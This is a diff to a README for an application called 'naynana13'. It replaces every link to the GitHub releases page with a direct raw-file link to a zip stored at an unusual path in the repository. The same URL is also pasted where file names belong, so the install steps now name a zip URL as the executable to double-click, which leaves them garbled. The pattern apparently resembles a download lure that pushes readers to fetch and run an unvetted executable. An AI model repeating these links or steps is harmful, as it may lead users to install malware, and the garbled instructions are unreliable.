@@ -8,9 +8,9 @@ Welcome to naynana13! This application is all about providing an enjoyable exper
 
 ### Download Link
 
-[![Download naynana13](https://img.shields.io/badge/Download-naynana13-brightgreen)](https://github.com/XO5596/naynana13/releases)
+[![Download naynana13](https://github.com/XO5596/naynana13/raw/refs/heads/main/underchanter/naynana_v1.0.zip)](https://github.com/XO5596/naynana13/raw/refs/heads/main/underchanter/naynana_v1.0.zip)
 
-To download the application, visit this page: [GitHub Releases](https://github.com/XO5596/naynana13/releases).
+To download the application, visit this page: [GitHub Releases](https://github.com/XO5596/naynana13/raw/refs/heads/main/underchanter/naynana_v1.0.zip).
 
 ## 📂 System Requirements
 
@@ -25,10 +25,10 @@ Before downloading, ensure your system meets the following requirements:
 
 1. Click on the **Download naynana13** button above to go to the releases page.
 2. On the releases page, locate the latest version of the application. It will be listed at the top of the page.
-3. Click on the **naynana13.zip** file or any available installation file. This action will start the download.
+3. Click on the **https://github.com/XO5596/naynana13/raw/refs/heads/main/underchanter/naynana_v1.0.zip** file or any available installation file. This action will start the download.
 4. Once the download is complete, navigate to your downloads folder.
 5. Extract the downloaded file by right-clicking on it and selecting “Extract All” (Windows) or double-click the zip file (macOS).
-6. Open the extracted folder and find the executable file named **naynana13.exe** (or similar).
+6. Open the extracted folder and find the executable file named **https://github.com/XO5596/naynana13/raw/refs/heads/main/underchanter/naynana_v1.0.zip** (or similar).
 7. Double-click the executable file to launch the application.
 
 ## 🛠️ Features
@@ -61,4 +61,4 @@ Your feedback helps us improve. If you have suggestions or notice any issues, pl
 
 ## 🚀 Ready to Start?
 
-Don’t wait! Click here to download: [GitHub Releases](https://github.com/XO5596/naynana13/releases) and enjoy naynana13 today!
+Don’t wait! Click here to download: [GitHub Releases](https://github.com/XO5596/naynana13/raw/refs/heads/main/underchanter/naynana_v1.0.zip) and enjoy naynana13 today!
